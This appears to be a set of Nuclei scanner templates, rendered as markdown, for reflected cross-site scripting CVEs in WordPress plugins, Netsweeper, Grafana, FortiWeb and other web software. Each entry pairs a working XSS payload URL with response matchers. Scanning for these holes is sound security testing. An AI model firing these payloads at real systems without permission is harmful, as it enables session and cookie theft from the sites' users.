    1. var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//

**Type - word**
- part - header
- words
    1. text/html

---
# HPE System Management - Cross-Site Scripting
## Description
- HPE System Management contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2017,xss,hp
## Requests
- Method - GET
### URL
- {{BaseURL}}/gsearch.php.en?prod=';prompt`document.domain`;//
### Matchers

**Type - word**
- words
    1. var prodName = '';prompt`document.domain`;//';
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Dreambox WebControl 2.0.0 - Cross-Site Scripting
## Description
- Dream Multimedia Dreambox devices via their WebControl component are vulnerable to reflected cross-site scripting, as demonstrated by the "Name des Bouquets" field, or the file parameter to the /file URI.

- severity - medium
- tags - dreambox,edb,cve,cve2017,xss
## Requests
### Step - 1
```
GET /webadmin/pkg?command=<script>alert(document.cookie)</script> HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```
### Matchers

**Type - word**
- words
    1. Unknown command: \<script>alert(document.cookie)\</script>

---
# KMCIS CaseAware - Cross-Site Scripting
## Description
- KMCIS CaseAware contains a reflected cross-site scripting vulnerability via the user parameter transmitted in the login.php query string.
- severity - medium
- tags - edb,cve,cve2017,xss,caseaware
## Requests
- Method - GET
### URL
- {{BaseURL}}/login.php?mid=0&usr=admin%27%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. '>\</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DokuWiki - Cross-Site Scripting
## Description
- DokuWiki through 2017-02-19b contains a cross-site scripting vulnerability in the DATE_AT parameter to doku.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2017,xss,dokuwiki
## Requests
- Method - GET
### URL
- {{BaseURL}}/dokuwiki/doku.php?id=wiki:welcome&at=\<svg%20onload=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. Unable to parse at parameter "\<svg onload=alert(document.domain)>".\</div>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WSO2 Data Analytics Server 3.1.0 - Cross-Site Scripting
## Description
- WSO2 Data Analytics Server 3.1.0 is susceptible to cross-site scripting in carbon/resources/add_collection_ajaxprocessor.jsp via the collectionName or parentPath parameter.
- severity - medium
- tags - cve,cve2017,wso2,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/carbon/resources/add_collection_ajaxprocessor.jsp?collectionName=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&parentPath=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
### Matchers

**Type - word**
- words
    1. \<img src=x onerror=alert(document.domain)>
    2. Failed to add new collection
- part - body
- condition - and

**Type - word**
- words
    1. text/html
- part - header

---
# WordPress amtyThumb Posts 8.1.3 - Cross-Site Scripting
## Description
- WordPress amty-thumb-recent-post plugin 8.1.3 contains a cross-site scripting vulnerability via the query string to amtyThumbPostsAdminPg.php.
- severity - medium
- tags - xss,wp-plugin,packetstorm,cve,cve2017,wordpress
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/wp-content/plugins/amty-thumb-recent-post/amtyThumbPostsAdminPg.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E=1
  - amty_hidden=1
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Reflected XSS - Telerik Reporting Module
## Description
- Cross-site scripting vulnerability in Telerik.ReportViewer.WebForms.dll in Telerik Reporting for ASP.NET WebForms Report Viewer control before R1 2017 SP2 (11.0.17.406) allows remote attackers to inject arbitrary web script or HTML via the bgColor parameter to Telerik.ReportViewer.axd.
- severity - medium
- tags - cve,cve2017,xss,telerik
## Requests
- Method - GET
### URL
- {{BaseURL}}/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. #000000"onload="prompt(1)
    2. Telerik.ReportViewer.axd?name=Resources
- condition - and

---
# WordPress Mailster \<=1.5.4 - Cross-Site Scripting
## Description
- WordPress Mailster 1.5.4 and before contains a cross-site scripting vulnerability in the unsubscribe handler via the mes parameter to view/subscription/unsubscribe2.php.
- severity - medium
- tags - cve,cve2017,wordpress,xss,wp-plugin,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wp-mailster/view/subscription/unsubscribe2.php?mes=%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Oracle Content Server - Cross-Site Scripting
## Description
- Oracle Content Server version 11.1.1.9.0, 12.2.1.1.0 and 12.2.1.2.0 are susceptible to cross-site scripting. The vulnerability can be used to include HTML or JavaScript code in the affected web page. The code is executed in the browser of users if they visit the manipulated site.

- severity - high
- tags - cve,cve2017,xss,oracle
## Requests
- Method - GET
### URL
- {{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX\<svg/onload=alert(document.domain)>&dSecurityGroup=&QueryText=(dInDate+>=+%60\<$dateCurrent(-7)$>%60)&PageTitle=OO
- {{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX\<svg/onload=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. \<svg/onload=alert(document.domain)>
    2. ORACLE_QUERY
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Qards - Cross-Site Scripting
## Description
- WordPress Qards through 2017-10-11 contains a cross-site scripting vulnerability via a remote document specified in the URL parameter to html2canvasproxy.php.
- severity - medium
- tags - wp-plugin,oast,wpscan,cve,cve2017,wordpress,ssrf,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/qards/html2canvasproxy.php?url=https://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- part - body
- words
    1. console.log

---
# Siemens SIMATIC S7-1200 CPU - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in the integrated web server on Siemens SIMATIC S7-1200 CPU devices 2.x and 3.x allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.
- severity - medium
- tags - cve,cve2014,xss,siemens,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/Portal/Portal.mwsl?PriNav=Bgz&filtername=Name&filtervalue=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Send=Filter
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Ultimate Weather Plugin \<= 1.0 - Cross-Site Scripting
## Description
- The ultimate-weather plugin 1.0 for WordPress contains a cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2014,wordpress,wp-plugin,xss,weather,wpscan,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. ">\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Netsweeper 4.0.8 - Cross-Site Scripting
## Description
- Multiple cross-site scripting vulnerabilities in Netsweeper before 3.1.10, 4.0.x before 4.0.9, and 4.1.x before 4.1.2 allow remote attackers to inject arbitrary web script or HTML via the (1) server parameter to remotereporter/load_logfiles.php, (2) customctid parameter to webadmin/policy/category_table_ajax.php, (3) urllist parameter to webadmin/alert/alert.php, (4) QUERY_STRING to webadmin/ajaxfilemanager/ajax_get_file_listing.php, or (5) PATH_INFO to webadmin/policy/policy_table_ajax.php/.
- severity - medium
- tags - cve2014,netsweeper,xss,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/webadmin/policy/category_table_ajax.php?customctid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Import Legacy Media \<= 0.1 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in the Import Legacy Media plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. '>\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Podcast Channels \< 0.28 - Cross-Site Scripting
## Description
- The Podcast Channels WordPress plugin was affected by an unauthenticated reflected cross-site scripting security vulnerability.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/podcast-channels/getid3/demos/demo.write.php?Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Shortcode Ninja \<= 1.4 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in preview-shortcode-external.php in the Shortcode Ninja plugin 1.4 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the shortcode parameter.
- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2014,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php?shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e
### Matchers

**Type - word**
- words
    1. '>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Infusionsoft Gravity Forms Add-on \< 1.5.7 - Cross-Site Scripting
## Description
- Multiple cross-site scripting vulnerabilities in tests/notAuto_test_ContactService_pauseCampaign.php in the Infusionsoft Gravity Forms plugin before 1.5.6 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) go, (2) contactId, or (3) campaignId parameter.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&
### Matchers

**Type - word**
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Frontend Uploader \<= 0.9.2 - Cross-Site Scripting
## Description
- The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.
- severity - medium
- tags - wp-plugin,xss,wpscan,packetstorm,cve,cve2014,wordpress,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Netsweeper 4.0.4 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in Netsweeper 4.0.4 allows remote attackers to inject arbitrary web script or HTML via the url parameter to webadmin/deny/index.php.
- severity - medium
- tags - cve,cve2014,netsweeper,xss,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/webadmin/deny/index.php?dpid=1&dpruleid=1&cat=1&ttl=5018400&groupname=\<group_name_eg_netsweeper_student_allow_internet_access&policyname=auto_created&username=root&userip=127.0.0.1&connectionip=127.0.0.1&nsphostname=netsweeper&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Netsweeper 4.0.3 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in webadmin/policy/group_table_ajax.php/ in Netsweeper before 3.1.10, 4.0.x before 4.0.9, and 4.1.x before 4.1.2 allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO.
- severity - medium
- tags - cve,cve2014,netsweeper,xss,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/webadmin/policy/group_table_ajax.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Netsweeper 4.0.4 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in remotereporter/load_logfiles.php in Netsweeper 4.0.3 and 4.0.4 allows remote attackers to inject arbitrary web script or HTML via the url parameter.
- severity - medium
- tags - packetstorm,cve,cve2014,netsweeper,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/remotereporter/load_logfiles.php?server=018192&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress DZS-VideoGallery Plugin Cross-Site Scripting
## Description
- Multiple cross-site scripting vulnerabilities in deploy/designer/preview.php in the Digital Zoom Studio (DZS) Video Gallery plugin for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) swfloc or (2) designrand parameter.
- severity - medium
- tags - cve2014,wordpress,xss,wp-plugin,seclists,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
### Matchers

**Type - word**
- words
    1. \<script>alert(1)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Movies \<= 0.6 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in the Movies plugin 0.6 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2014,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&
### Matchers

**Type - word**
- words
    1. '>\<script>alert(document.cookie)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WooCommerce Swipe \<= 2.7.1 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in test-plugin.php in the Swipe Checkout for WooCommerce plugin 2.7.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the api_url parameter.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,woocommerce,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E 
### Matchers

**Type - word**
- words
    1. '>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ActiveHelper LiveHelp Server 3.1.0 - Cross-Site Scripting
## Description
- Multiple cross-site scripting vulnerabilities in server/offline.php in the ActiveHelper LiveHelp Live Chat plugin 3.1.0 and earlier for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) MESSAGE, (2) EMAIL, or (3) NAME parameter.
- severity - medium
- tags - cve,cve2014,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&
### Matchers

**Type - word**
- words
    1. \</textarea>\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WP Planet \<= 0.1 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in rss.class/scripts/magpie_debug.php in the WP-Planet plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the url parameter.
- severity - medium
- tags - cve2014,wordpress,wp-plugin,xss,wpscan,cve,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Sniplets \<=1.2.2 - Cross-Site Scripting
## Description
- WordPress Sniplets 1.1.2 and 1.2.2 plugin contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the text parameter to warning.php, notice.php, and inset.php in view/sniplets/, and possibly modules/execute.php; via the url parameter to view/admin/submenu.php; and via the page parameter to view/admin/pager.php.

- severity - high
- tags - xss,wp-plugin,wp,edb,wpscan,cve,cve2008,wordpress,sniplets
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AppServ Open Project \<=2.5.10 - Cross-Site Scripting
## Description
- AppServ Open Project 2.5.10 and earlier contains a cross-site scripting vulnerability in index.php which allows remote attackers to inject arbitrary web script or HTML via the appservlang parameter.
- severity - medium
- tags - cve,cve2008,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<svg/onload=confirm('xss')>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Parallels H-Sphere - Cross Site Scripting
## Description
- Multiple cross-site scripting (XSS) vulnerabilities in login.php in webshell4 in Parallels H-Sphere 3.0.0 P9 and 3.1 P1 allow remote attackers to inject arbitrary web script or HTML via the (1) err, (2) errorcode, and (3) login parameters.

- severity - medium
- tags - cve,cve2008,xss,parallels,h-sphere
## Requests
- Method - GET
### URL
- {{BaseURL}}/webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=U
### Matchers

**Type - word**
- part - body
- words
    1. \" onfocus=alert(document.domain); autofocus
    2. Please enter login name &amp; password
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Devalcms 1.4a - Cross-Site Scripting
## Description
- Devalcms 1.4a contains a cross-site scripting vulnerability in the currentpath parameter of the index.php file.

- severity - high
- tags - cve,cve2008,devalcms,xss,cms,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. sub menu for: \<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 500

---
# WooCommerce PDF Invoices & Packing Slips WordPress Plugin \< 2.10.5 - Cross-Site Scripting
## Description
- The Wordpress plugin WooCommerce PDF Invoices & Packing Slips before 2.10.5 does not escape the tab and section parameters before reflecting it an attribute, leading to a reflected cross-site scripting in the admin dashboard.
- severity - medium
- tags - cve,cve2021,xss,wp,wordpress,wp-plugin,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&section=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x%3D HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. " style=animation-name:rotation onanimationstart=alert(document.domain) x
    2. WooCommerce PDF Invoices
- condition - and

**Type - status**
- status
    1. 200

---
# WordPress Goto Tour & Travel Theme \<2.0 - Cross-Site Scripting
## Description
- WordPress Goto Tour & Travel theme before 2.0 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize the keywords and start_date GET parameters on its Tour List page.
- severity - medium
- tags - xss,wp-theme,wpscan,cve,cve2021,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/tour-list/?keywords=%3Cinput%2FAutofocus%2F%250D*%2FOnfocus%3Dalert%28123%29%3B%3E&start_date=xxxxxxxxxxxx&avaibility=13
### Matchers

**Type - word**
- words
    1. input/Autofocus/%0D*/Onfocus=alert(123);
    2. goto-tour-list-js-extra
- part - body
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Advantech R-SeeNet - Cross-Site Scripting
## Description
- Advantech R-SeeNet is vulnerable to cross-site scripting via the device_graph_page.php script via the is2sim parameter. A specially crafted URL by an attacker and visited by a victim can lead to arbitrary JavaScript code execution.
- severity - medium
- tags - cve,cve2021,rseenet,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22
### Matchers

**Type - word**
- words
    1. "zlo onerror=alert(1) "
    2. Device Status Graph
- part - body
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress OpenID Connect Generic Client 3.8.0-3.8.1 - Cross-Site Scripting
## Description
- WordPress OpenID Connect Generic Client plugin 3.8.0 and 3.8.1 contains a cross-site scripting vulnerability. It does not sanitize the login error when output back in the login form, thereby not requiring authentication, which can be exploited with the default configuration.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin,wp,openid
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-login.php?login-error=\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. ERROR (\<script>alert(document.domain)\</script>):
    2. Login with OpenID Connect
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Ocean Extra \<1.9.5 - Cross-Site Scripting
## Description
- WordPress Ocean Extra plugin before 1.9.5 contains a cross-site scripting vulnerability. The plugin does not escape generated links which are then used when the OceanWP theme is active.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,authenticated,wpscan,wp,ocean-extra
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/?step=demo&page=owp_setup&a"><script>alert(/XSS/)</script>   HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. OceanWP
    2. >\<script>alert(/XSS/)\</script>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# FortiWeb - Cross-Site Scripting
## Description
- FortiWeb 6.3.0 through 6.3.7 and versions before 6.2.4 contain an unauthenticated cross-site scripting vulnerability. Improper neutralization of input during web page generation can allow a remote attacker to inject malicious payload in vulnerable API end-points.

- severity - medium
- tags - cve,cve2021,fortiweb,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/error3?msg=30&data=';alert('nuclei');//
- {{BaseURL}}/omni_success?cmdb_edit_path=");alert('nuclei');//
### Matchers

**Type - word**
- words
    1. nuclei
    2. No policy has been chosen.
- condition - and
- part - body

---
# i-Panel Administration System 2.0 - Cross-Site Scripting
## Description
- i-Panel Administration System 2.0 contains a cross-site scripting vulnerability that enables an attacker to execute arbitrary JavaScript code in the browser-based web console.

- severity - medium
- tags - cve,cve2021,ipanel,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/lostpassword.php/n4gap%22%3E%3Cimg%20src=a%20onerror=alert(%22document.domain%22)%3E
### Matchers

**Type - word**
- part - body
- words
    1. >\<img src=a onerror=alert("document.domain")>
    2. i-Panel Administration
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Opensis-Classic 8.0 - Cross-Site Scripting
## Description
- Opensis-Classic Version 8.0 is affected by cross-site scripting. An unauthenticated user can inject and execute JavaScript code through the link_url parameter in Ajax_url_encode.php.

- severity - medium
- tags - xss,cve,cve2021,opensis
## Requests
- Method - GET
### URL
- {{BaseURL}}/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Grafana 8.0.0 \<= v.8.2.2 - Angularjs Rendering Cross-Site Scripting
## Description
- Grafana is an open-source platform for monitoring and observability. In affected versions if an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser. The user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar. The url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions.
- severity - medium
- tags - cve,cve2021,grafana,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. Grafana
    2. frontend_boot_js_done_time_seconds
- condition - and

**Type - regex**
- regex
    1. "subTitle":"Grafana (v8\.(?:(?:1|0)\.[0-9]|2\.[0-2]))
### Extractors

**Type - regex**
- group - 1
- regex
    1. "subTitle":"Grafana ([a-z0-9.]+)

---
# FUDForum 3.1.0 - Cross-Site Scripting
## Description
- FUDForum 3.1.0 contains a cross-site scripting vulnerability which allows remote attackers to inject JavaScript via index.php in the "srch" parameter.

- severity - medium
- tags - xss,fudforum,edb,packetstorm,cve,cve2021
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?SQ=0&srch=x"+onmouseover%3Dalert%281%29+x%3D"&t=search&btn_submit.x=0&btn_submit.y=0
### Matchers

**Type - word**
- part - body
- words
    1. highlightSearchTerms("x" onmouseover=alert(1) x="");

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# npm ansi_up v4 - Cross-Site Scripting
## Description
- npm package ansi_up v4 is vulnerable to cross-site scripting because ANSI escape codes can be used to create HTML hyperlinks.
- severity - medium
- tags - cve,cve2021,xss,npm
## Requests
### Step - 1
```
GET /\u001B]8;;https://interact.sh"/onmouseover="alert(1)\u0007example\u001B]8;;\u0007 HTTP/1.1
Host: {{Hostname}}
Connection: close


```
### Matchers

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- words
    1. sh"/onmouseover="alert(1)">

---
